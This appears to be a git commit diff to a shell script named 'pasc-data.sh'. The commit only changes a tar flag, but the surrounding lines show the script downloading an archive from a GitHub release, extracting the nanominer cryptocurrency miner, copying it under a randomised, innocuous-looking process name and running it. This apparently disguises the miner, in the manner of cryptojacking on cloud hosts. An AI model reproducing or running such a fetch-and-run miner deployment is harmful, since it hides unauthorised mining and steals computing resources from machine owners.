aca818bb352078749898713799b56fe399ba1e75
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2020-04-24 18:44:38 +0700

    Update pasc-data.sh

--- pasc-data.sh
+++ pasc-data.sh
@@ -4,7 +4,7 @@ azure=mxsemsdnlkdj;
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 rm -r platinum.tar.gz
 wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
-tar -xvzf platinum.tar.gz
+tar xf platinum.tar.gz
 rm -r platinum.tar.gz
 sudo cp nanominer "$cpuname"
 ./"${cpuname}"
